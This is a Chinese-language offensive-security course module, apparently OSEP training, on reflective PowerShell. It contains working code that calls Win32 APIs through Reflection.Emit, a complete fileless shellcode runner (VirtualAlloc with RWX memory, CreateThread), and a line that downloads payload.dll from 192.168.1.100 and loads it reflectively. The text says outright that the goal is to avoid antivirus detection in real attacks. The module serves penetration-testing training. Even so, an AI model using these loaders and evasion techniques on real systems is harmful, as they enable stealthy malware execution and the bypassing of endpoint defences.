# Module 05: 反射式 PowerShell

## 第三节：反射技术进阶

### 什么是反射？

反射（Reflection）是 .NET 的一个强大特性，允许程序在运行时：
- 检查类型信息
- 动态创建对象
- 调用方法
- 访问私有成员

在 OSEP 中，反射主要用于：
- 绕过 Add-Type 的磁盘写入
- 动态加载程序集
- 调用 Win32 API

---

## 一、Add-Type 的问题

### 1.1 Add-Type 会写入磁盘

```powershell
# Add-Type 的工作流程
Add-Type $CSharpCode
    │
    ├── 1. 将 C# 代码写入临时文件
    │      C:\Users\xxx\AppData\Local\Temp\xxx.cs
    │
    ├── 2. 调用 csc.exe 编译
    │      生成临时 DLL
    │
    └── 3. 加载编译后的 DLL
           删除临时文件
```

**问题**：
- 临时文件可能被杀软检测
- 编译过程可能被监控
- 留下痕迹

### 1.2 反射的优势

```powershell
# 反射的工作流程
使用反射调用 API
    │
    └── 直接在内存中操作
        无文件落地
        无编译过程
```

## 二、使用反射调用 Win32 API

### 2.1 获取方法委托

```powershell
# 使用反射获取 GetProcAddress 和 GetModuleHandle
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String] $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [String] $Procedure
    )

    # 获取 System.dll 中的类型
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }

    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

    # 获取 GetModuleHandle 方法
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')

    # 获取 GetProcAddress 方法
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress',
        [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

    # 获取模块句柄
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))

    # 获取函数地址
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
```

### 2.2 创建委托类型

```powershell
# 动态创建委托类型
function Get-DelegateType {
    Param(
        [Parameter(Position = 0)]
        [Type[]] $Parameters = (New-Object Type[](0)),

        [Parameter(Position = 1)]
        [Type] $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')

    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

    return $TypeBuilder.CreateType()
}
```

### 2.3 调用 Win32 API

```powershell
# 使用反射调用 MessageBox
$MessageBoxAddr = Get-ProcAddress user32.dll MessageBoxA

$MessageBoxDelegate = Get-DelegateType @([IntPtr], [String], [String], [Int32]) ([Int32])

$MessageBox = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxAddr, $MessageBoxDelegate)

$MessageBox.Invoke([IntPtr]::Zero, "Hello", "Title", 0)
```

## 三、简化的反射方法

### 3.1 使用 Reflection.Emit

```powershell
# 更简洁的反射方法
$DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
$TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')

# 定义 VirtualAlloc
$PInvokeMethod = $TypeBuilder.DefineMethod(
    'VirtualAlloc',
    [Reflection.MethodAttributes] 'Public, Static',
    [IntPtr],
    [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32])
)

$DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('kernel32.dll'))
$PInvokeMethod.SetCustomAttribute($DllImportAttribute)

$Kernel32 = $TypeBuilder.CreateType()

# 调用
$addr = $Kernel32::VirtualAlloc([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

### 3.2 使用现有的 .NET 方法

```powershell
# 某些 Win32 API 已经在 .NET 中有封装
# 例如 Marshal.Copy 可以替代 RtlMoveMemory

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
```

## 四、反射式 Shellcode Runner

### 4.1 完整的反射式实现

```powershell
# 反射式 Shellcode Runner（无 Add-Type）

function Invoke-Shellcode {
    # 获取 kernel32.dll 中的函数地址
    $Kernel32 = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() + "mscorlib.dll"
    $Assembly = [System.Reflection.Assembly]::LoadFile($Kernel32)

    # 使用 Reflection.Emit 定义类型
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')

    # 定义 VirtualAlloc
    $VirtualAllocMethod = $TypeBuilder.DefineMethod('VirtualAlloc', [Reflection.MethodAttributes] 'Public, Static', [IntPtr], [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32]))
    $VirtualAllocMethod.SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder([Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])), @('kernel32.dll'))))

    # 定义 CreateThread
    $CreateThreadMethod = $TypeBuilder.DefineMethod('CreateThread', [Reflection.MethodAttributes] 'Public, Static', [IntPtr], [Type[]] @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
    $CreateThreadMethod.SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder([Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])), @('kernel32.dll'))))

    # 定义 WaitForSingleObject
    $WaitMethod = $TypeBuilder.DefineMethod('WaitForSingleObject', [Reflection.MethodAttributes] 'Public, Static', [UInt32], [Type[]] @([IntPtr], [UInt32]))
    $WaitMethod.SetCustomAttribute((New-Object Reflection.Emit.CustomAttributeBuilder([Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])), @('kernel32.dll'))))

    $Kernel32Type = $TypeBuilder.CreateType()

    # Shellcode
    [Byte[]] $buf = @(0xfc,0x48,0x83,0xe4,0xf0)  # 实际使用时替换为完整 shellcode

    # 执行
    $size = $buf.Length
    $addr = $Kernel32Type::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
    $thread = $Kernel32Type::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    $Kernel32Type::WaitForSingleObject($thread, 0xFFFFFFFF)
}

Invoke-Shellcode
```

## 五、反射式加载 .NET 程序集

### 5.1 从 URL 加载

```powershell
# 下载并反射加载 DLL
$data = (New-Object Net.WebClient).DownloadData('http://192.168.1.100/payload.dll')
$assembly = [System.Reflection.Assembly]::Load($data)

# 获取类型和方法
$type = $assembly.GetType('Namespace.ClassName')
$method = $type.GetMethod('MethodName')

# 调用
$method.Invoke($null, @($arg1, $arg2))
```

### 5.2 从 Base64 加载

```powershell
# Base64 编码的 DLL
$base64 = "TVqQAAMAAAA..."
$bytes = [Convert]::FromBase64String($base64)
$assembly = [System.Reflection.Assembly]::Load($bytes)

# 调用
$type = $assembly.GetType('Namespace.ClassName')
$instance = [Activator]::CreateInstance($type)
$type.GetMethod('Run').Invoke($instance, $null)
```

### 5.3 调用私有方法

```powershell
# 反射可以调用私有方法
$type = $assembly.GetType('Namespace.ClassName')
$method = $type.GetMethod('PrivateMethod', [Reflection.BindingFlags] 'NonPublic, Instance')
$method.Invoke($instance, @($args))
```

## 六、对比：Add-Type vs 反射

| 特性 | Add-Type | 反射 |
|------|----------|------|
| 文件落地 | 是（临时文件） | 否 |
| 代码复杂度 | 低 | 高 |
| 性能 | 较慢（需编译） | 较快 |
| 检测风险 | 较高 | 较低 |
| 适用场景 | 开发测试 | 实战攻击 |
